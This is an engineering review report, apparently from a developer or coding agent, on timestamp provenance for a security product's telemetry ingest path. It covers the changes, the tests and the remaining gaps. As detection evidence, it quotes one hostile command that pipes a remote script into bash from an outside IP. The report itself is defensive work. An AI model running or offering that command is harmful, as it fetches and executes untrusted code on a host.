# D11 — INGEST PATH PROVENANCE (owner review gate)

Date: 2026-09-14 · Scope: **collector-delivered path** (`POST
/api/xdr/ingest/telemetry`) · **PREVIEW ONLY — no production deployment.**

Reproduce with:
```
cd /app/backend && python -m pytest tests/test_d11_ingest_provenance.py -q
cd /app          && python scripts/p0_d11_ingest_provenance_live_proof.py
```

---

## A · Ingest paths inspected / files changed

| File | Δ | What |
|---|---|---|
| `backend/services/ingest_provenance.py` | **NEW**, 176 | The three transport boundaries, ISO validation, the improve-only merge rule, and the delivery-identity block |
| `backend/routers/xdr_ingest.py` | +80 | Captures the real HTTP receipt instant; builds per-envelope provenance; carries the raw-row reference into reasoning; declares `received_at` substitution on the raw row |
| `backend/detection_content/xdr_pipeline.py` | +10 | New `ingest_provenance=` argument; applies the transport stamps and the delivery identity after normalization |
| `backend/detection_content/telemetry/linux_auditd_dsm.py` | +55 | Parser marks the audit-header timestamp state; normalizer derives `activity_occurred_at` and declares `event_time_basis` |
| `backend/services/provenance_timestamps.py` | +5 | A measured value may now also carry a caveat (`reason`) |
| `backend/tests/test_d11_ingest_provenance.py` | **NEW**, 31 tests | |
| `scripts/p0_d11_ingest_provenance_live_proof.py` | **NEW** | Live preview proof over real HTTP |

Paths traced: the **collector-delivered** path
(`/api/xdr/ingest/telemetry` → idempotency claim → raw row in
`xdr_canonical_events` → `_reason_batch` → D4 stitch plan →
`process_event_through_pipeline` → DSM/parser/normalizer → canonical
evidence → detection → D8 citation). The **direct sensor** path was not
re-opened: D1/D9 already own it, and it is verified unchanged (see M).

## B · Canonical timestamp fields

No new field names were invented. The existing D1 block
(`provenance.timestamps`, eight boundaries, four statuses) is reused
verbatim. What changed is **who fills which boundary on the ingest path**:

| Boundary | Filled by | On the auditd ingest path |
|---|---|---|
| `activity_occurred_at` | linux-auditd normalizer | `msg=audit(epoch:serial)`, else NOT_OBSERVED |
| `sensor_observed_at` | ingest handler | `envelope.source_timestamp`, else NOT_OBSERVED |
| `collector_received_at` | ingest handler | `envelope.received_at` → `envelope.collection_timestamp`, else NOT_OBSERVED |
| `nivx_received_at` | ingest handler | the real HTTP receipt instant |
| `parsed_at` | pipeline | unchanged (D1) |
| `normalized_at` | pipeline | unchanged (D1) |
| `rule_evaluated_at` | pipeline | unchanged (D1) |
| `verdict_at` | pipeline | unchanged (D1) |

New non-timestamp provenance: `provenance.ingest` (delivery identity, §E/F/G)
and four declaration fields in `additional_fields` (§E).

## C · Source of every timestamp (verbatim from preview storage)

`cev_auditd_…` · tenant `t-d11-proof` · stitched SYSCALL+EXECVE+PROCTITLE:

| Stamp | Status | Value | Source |
|---|---|---|---|
| `activity_occurred_at` | AVAILABLE | 2025-09-09T21:21:28.555000+00:00 | `auditd:msg=audit(epoch:serial)` |
| `sensor_observed_at` | AVAILABLE | 2026-06-01T10:00:01.250000+00:00 | `collector:envelope.source_timestamp` |
| `collector_received_at` | AVAILABLE | 2026-06-01T10:00:02.500000+00:00 | `collector:envelope.received_at` |
| `nivx_received_at` | AVAILABLE | 2026-09-14T16:13:06.224235+00:00 | `ingest:http receipt POST /api/xdr/ingest/telemetry` |
| `parsed_at` | AVAILABLE | …06.234156+00:00 | `pipeline:parser:linux-auditd-parser` |
| `normalized_at` | AVAILABLE | …06.234653+00:00 | `pipeline:normalizer:linux-auditd-normalizer` |
| `rule_evaluated_at` | AVAILABLE | …06.236137+00:00 | `pipeline:detection:nivxray::detection_content::nivxray_native_sigma` |
| `verdict_at` | AVAILABLE | …06.243236+00:00 | `pipeline:verdict:nivxray::xdr::veee` |

All eight values are **distinct**, and the live proof asserts the
`nivx_received_at` value falls inside the wall-clock window of the HTTP
request it claims to describe — so it is a measurement, not a label.

## D · MISSING / NOT_OBSERVED / NOT_APPLICABLE behaviour

Three distinct answers, and they are not merged:

* **NOT_OBSERVED** — the boundary exists, the producer never reported it.
  A delivery with no `source_timestamp`/`received_at` yields
  `sensor_observed_at` and `collector_received_at` NOT_OBSERVED with their
  own reasons. Verified in preview that `nivx_received_at` was **not** copied
  into either of them, nor into `activity_occurred_at`.
* **NOT_APPLICABLE** — the boundary does not exist on this shape of path.
  `collector_received_at` on the direct sensor path (unchanged from D1).
* **MISSING** — it should have been captured and was not. Two sub-cases,
  deliberately ranked differently:
  * a boundary nobody spoke for (the `block()` placeholder) — carries no
    source, and any producer may fill it;
  * a value that **was delivered and is unreadable** — carries the envelope
    field it arrived in plus the parse error, e.g.
    `collector:envelope.source_timestamp: supplied value is not a parseable
    ISO-8601 timestamp: 'yesterday afternoon'`.

The merge rule (`ingest_provenance.apply`) only ever **improves** a
boundary: AVAILABLE > delivered-but-unreadable MISSING > NOT_OBSERVED /
NOT_APPLICABLE > bare placeholder. A less informed producer can never demote
a measurement. This rule was **found to be wrong on first implementation by
the live proof**, not by assertion: a broken collector timestamp was being
hidden behind the normalizer's NOT_OBSERVED placeholder. Fixed and now tested
directly (`test_a_broken_collector_outranks_the_dsm_not_observed_placeholder`).

Offsets are never assumed. A parseable value with no UTC offset is kept
**verbatim** (not suffixed with `Z`) and carries the caveat
"the supplied value carries no UTC offset; it is recorded verbatim and its
offset is UNKNOWN".

## E · `event_time` compatibility / substitution

`event_time` stays populated for schema and rule compatibility, and the
substitution is now declared rather than silent. Four new
`additional_fields`:

| Case | `event_time_basis` | `event_time_substituted` | `activity_occurred_at` |
|---|---|---|---|
| audit header readable | `ACTIVITY_TIME` | `false` | AVAILABLE |
| a `timestamp` rode in on the delivery, origin unverifiable | `SUPPLIED_TIMESTAMP_UNVERIFIED` | `true` | NOT_OBSERVED |
| nothing observed | `INGEST_TIME_SUBSTITUTED` | `true` | NOT_OBSERVED |

`audit_timestamp_state` (`OBSERVED` / `MALFORMED` / `ABSENT` /
`NOT_DETERMINED`) records **why**. A malformed `msg=audit(BROKEN:9002)` is
reported as MALFORMED — a broken source no longer looks the same as a record
that never carried a time. The substituted `event_time` is never copied into
`activity_occurred_at`.

The third row is the one the owner's brief calls out explicitly, and it is
reported as an open semantic: `SUPPLIED_TIMESTAMP_UNVERIFIED` is a fourth
basis beyond the two named in the approval. It exists because collapsing it
into `INGEST_TIME_SUBSTITUTED` would claim we substituted our own clock when
we did not, and collapsing it into `ACTIVITY_TIME` would claim a provenance
we cannot prove. **Flagged for owner ratification.**

## F · DSMs covered generically

The transport boundaries are stamped in `xdr_pipeline`, so **every**
collector-delivered DSM gets them: `linux-auditd`, `windows-security-evd`,
`microsoft-sysmon`, `aws-cloudtrail`, `cef-leef`, `snort-eve`. Nothing was
changed inside those parsers.

`activity_occurred_at` is auditd-only in this gate, as approved. See P.

## G · Collector identity, tenant attribution, raw-envelope preservation

`provenance.ingest`, verified in preview:

```
path_kind                    COLLECTOR_DELIVERED
collector_id                 col_7591bdccfbec44af91bf
collector_id_source          envelope.collector_id, verified against
                             xdr_collectors.tenant_id
tenant_id                    t-d11-proof
tenant_id_source             envelope.tenant_id, verified equal to header
                             X-Tenant-Id and to xdr_collectors.tenant_id
source_label                 d11-proof-host
source_label_source          collector:envelope.source — a collector CLAIM
                             of origin, not proven host identity
connector_id / data_source_id / collection_method /
collector_parser_version / collector_reported_event_type
raw_envelope_ref             {collection: xdr_canonical_events,
                              id: 6aa81e05…, state:
                              PERSISTED_BY_THIS_REQUEST}
```

The owner's standing caveat is now written into the evidence itself: the
collector's origin label is recorded as a **claim**, and the live proof
asserts that word is present. No control-plane or authentication logic was
touched — the tenant equality it cites is the one the existing guards already
proved.

`raw_envelope_ref` is resolvable: the proof loads the referenced
`xdr_canonical_events` row and asserts it is the same tenant, the same
collector, and carries the **same** `nivx_received_at` instant. A resumed
delivery cites `PERSISTED_BY_EARLIER_ATTEMPT` with the id from the
idempotency claim, or `MISSING` with a reason if that claim carried none.

The raw row also now declares `received_at_source` and
`received_at_substituted`, closing a second silent substitution:
`received_at` there fell back `envelope.received_at → collection_timestamp →
now()` with no way to tell which had happened.

## H · Replayed-real evidence proof

`scripts/p0_d11_ingest_provenance_live_proof.py` — **preview, over real
HTTP, 30/30 PASS**. Eight sections: provisioning, a timestamped delivery, the
canonical provenance, delivery identity + raw drill-down, a delivery with no
collector times, a malformed collector timestamp, a replayed delivery, and
the D8 citation.

Evidence labels, as required: **REPLAYED REAL EVIDENCE** — the EXECVE line is
the verbatim auditd line already in stored canonical evidence.
**TEST/SYNTHETIC** — the SYSCALL/PROCTITLE companions, the tenant
`t-d11-proof`, the collector and the key minted for the run.
**NOT LIVE** — no real auditd host is connected, and nothing was sent to
production.

## I · Synthetic proof

`tests/test_d11_ingest_provenance.py` — **31 tests, all passing**, covering
the owner's list: source timestamp present/absent (1,2), collector timestamp
present/absent with declared precedence (3,4), direct-sensor
NOT_APPLICABLE (5), collector-delivered receipt (6), malformed values (7),
offset present/absent/Zulu (8), replay determinism (9), cross-tenant
identical content (10), stitched (11) and unstitched partial (12) audit
events, D8 citations end-to-end (13) and raw drill-down (14) — plus
no-boundary-equals-another, all-eight-present, and the two merge-precedence
tests.

Cases 13 and 14 run the **real** pipeline and the **real** engines against a
throwaway MongoDB database (`nivx_d11_ingest_provenance_test`, dropped in a
`finally`), so nothing stubs the thing under test and nothing touches preview
or production data.

## J · D4 compatibility · K · D2/D3/D10 · L · D8

All green, on both the stitched and the unstitched path:

```
tests/test_d4_auditd_stitching.py            PASS
tests/test_d2_d3_d10_auditd_correctness.py   PASS
tests/test_d8_detection_citations.py         PASS      (62 passed together)
```

Live, in preview, on one stitched execution: 2× `STITCHED_INTO`, one
canonical event, `COMPLETE`, all three raw records reachable, identity
attributed to SYSCALL, command line attributed to EXECVE, and the D8 citation
for `DET-EX-006 v1` still cites the stitched command line
`curl -s http://198.51.100.9/x.sh | bash`. A lone EXECVE is still
`process_execution` (D3) and canonical ids are still deterministic (D10) —
the replay test asserts an identical `event_id` and an identical
`activity_occurred_at` across two deliveries whose receipt instants differ.

## M · Exact results · N · Clean-tree comparison

| Suite | Patched | Clean tree (`git worktree` at HEAD) |
|---|---|---|
| Targeted regression, 13 files | 4 failed · 161 passed · 20 errors | 4 failed · 161 passed · 20 errors |
| `diff` of the failure sets | — | **empty — identical, 24/24** |

The 4 failures are the pre-existing `test_xdr_detection_consolidation.py`
ones named in the handoff, left untouched as instructed. The 20 errors are
`test_xdr_data_sources_collectors.py` setup failing with
`ACCESS_DENIED … "reason":"unauthenticated"` on `POST /api/xdr/rbac/users` —
that is the parallel Work Mode auth track, it reproduces identically on the
clean tree, and it is **not mine to fix**.

Endpoint path (D1/D9) re-verified unchanged by re-running
`scripts/p0_real_loop_readonly_proof.py 8`: POST-PATCH **10/10 with no
MISSING stamp**, PRE-PATCH still honestly 0/3.

I did not attempt a full-suite comparison: two full runs share one MongoDB
and pollute each other's state (the handoff already records this), so the
numbers would have been noise presented as evidence.

## O · Storage / performance impact

Measured on a real preview canonical event:

| | Bytes |
|---|---|
| Canonical document, total | 4 916 |
| `provenance.timestamps` (8 boundaries) | 1 273 |
| `provenance.ingest` (delivery identity) | 708 |
| new `additional_fields` (4 declarations) | 156 |
| raw row: `nivx_received_at` + 2 basis fields | 161 |

Net ≈ **+1.6 KB per collector-delivered canonical event** and +161 B per raw
row. First implementation was **6 173 B** because the provenance block rode
inside `raw_event` and was therefore stored a second time inside `raw_ref`;
it is now passed alongside as `ingest_provenance=`, which removed ~1.25 KB
per event and, more importantly, keeps stored raw evidence exactly what the
collector sent.

Compute cost is one `datetime.fromisoformat` per supplied timestamp (≤2 per
envelope) and one dict assembly. Measured per-stage latencies in preview:
`nivx_received → parsed` 9.9 ms, `parsed → normalized` 0.5 ms — unchanged
within noise from the D1 baseline. No index was added; no query path changed.

## P · Known DSM activity-time gaps

As approved, `activity_occurred_at` is derived for **auditd only**. On
`windows-security-evd`, `microsoft-sysmon`, `aws-cloudtrail`, `cef-leef` and
`snort-eve` it stays the bare **MISSING** placeholder unless the collector
supplied `source_timestamp` (which fills `sensor_observed_at`, not activity
time). Those DSMs each have a genuine activity-time field in their payloads
(`TimeCreated`, `UtcTime`, `eventTime`, CEF `rt=`) and none of them is read
today. That is the single largest remaining provenance gap on the ingest
path, and it is deliberately out of this gate's scope.

Second open item, also deliberate: `event_time` on the auditd path is still
the compatibility field rules and timelines read. A consumer that reads
`event_time` and ignores `event_time_basis` still cannot tell activity time
from a substitution. Closing that properly means a schema decision (a
distinct activity-time field on canonical evidence), which I have not taken —
same position as D9.

Third: `collector:envelope.source` remains a collector **claim**. Recorded as
such; not elevated.

## Q · Verdict

**Ingest Path Provenance — PASS for preview scope.**

* Every boundary the collector-delivered path can honestly measure is
  measured, separately, with its own source.
* Every boundary it cannot is NOT_OBSERVED, NOT_APPLICABLE, or MISSING with
  a reason — verified in preview that no boundary borrows another's value.
* `event_time` substitution is declared, never disguised.
* Delivery identity and the raw row are cited and resolvable.
* D2/D3/D4/D8/D10 all still pass; the endpoint path is unchanged; the
  pre-existing failure set is byte-identical to a clean tree.

**Not production acceptance.** No real auditd host is connected, production
holds no active ingest credential, and nothing was deployed.

---

## STOP — awaiting owner review before PATH/CWD canonical mapping.
